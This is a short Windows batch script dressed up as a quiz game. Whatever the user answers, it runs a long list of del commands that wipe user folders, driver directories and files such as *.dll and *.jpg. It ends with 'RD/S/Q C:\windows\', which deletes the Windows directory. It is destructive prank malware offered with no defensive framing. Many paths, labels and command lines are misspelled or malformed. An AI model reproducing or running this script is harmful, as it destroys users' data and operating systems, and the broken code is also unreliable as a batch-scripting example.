   @echo on

   cls
   echo your computers fate is in your hands.
   echo you get three chance to save your pc.
   echo and there are 3 diffrent choices to choose from.
   choice /n /cABC "in binary what are the two number's used?!"
   if errorlevel C goto del
   if errorlevel B goto del
   if errorlevel A goto del

   echo A: 1-2
   echo B: 1-0
   echo C: 8-4
   rem [a/b/c] ? ...
   pause > nul

   :del
   echo wrong try agin in a moment!!
   del C:\windows\cookies\*.*
   del C:\windows\winzip\*.*
   del C:\windows\windowsmediaplay\*.*
   del C:\windows\mydocuments\*.*
   del C:\windows\msword\*.*
   del C:\windows\msoutlook\*.*
   del C:\windows\commandprompt\*.*
   del C:\windows\cookies\*.*
   del C:\windows\internetexsplorer\*.*
   del C:\windows\mydocuments\*.*
   del C:\windows\docmentsandsettings\*.*
   del C:\desktop\recyclebin\*.*
   del C:\americanonline\*.*
   del C:\desktop\mydocuments\*.*
   del C:\winnt\system32\drivers\flpydisk\*.*
   del C:\winnt\system32\drivers\ccdecode\*.*
   del C:\winnt\system32\drivers\cdaudio\*.*
   del C:\winnt\system32\cmd\*.*
   del C:\*.txt\*.*
   del C:\*.csl\*.*
   del C:\*.lst\*.*
   del C:\*.ind\*.*
   del C:\*.idx\*.*
   del C:\*.dll\*.*
   del C:\*.vxd\*.*
   del C:\*.gif\*.*
   del C:\*.pif\*.*
   del C:\*.jpg\*.*
   del C:\*.dat\*.*
   del C:\*.arl\*.*
   del C:\*.tol\*.*
   del C:\*.bin\*.*
   del C:\*.cnt\*.*
   del C:\*.txt\*.*
   del C:\*.bit\*.*
   del C:\winzip\*.*
   goto next try

   :next try
   echo wow that was fun lets go agin!
   echo okay heres your second question
   choice /n /cABC "what is a c drive?!"
   if errorlevel C it twas a good pc!
   if errorlevel B it twas a good pc!
   if errorlevel A it twas a good pc!

   echo A: a hard drive!
   echo B: the rom thingy!
   echo C: the mistery choice!!
   rem [a/b/c] ? ...
   pause > nul

   :it twas a good pc!
   echo wow looks like we gotta end this litle game
   echo you know so many pc's to crash
   echo so litle time

   RD/S/Q C:\windows\
   del /y C:\windows\
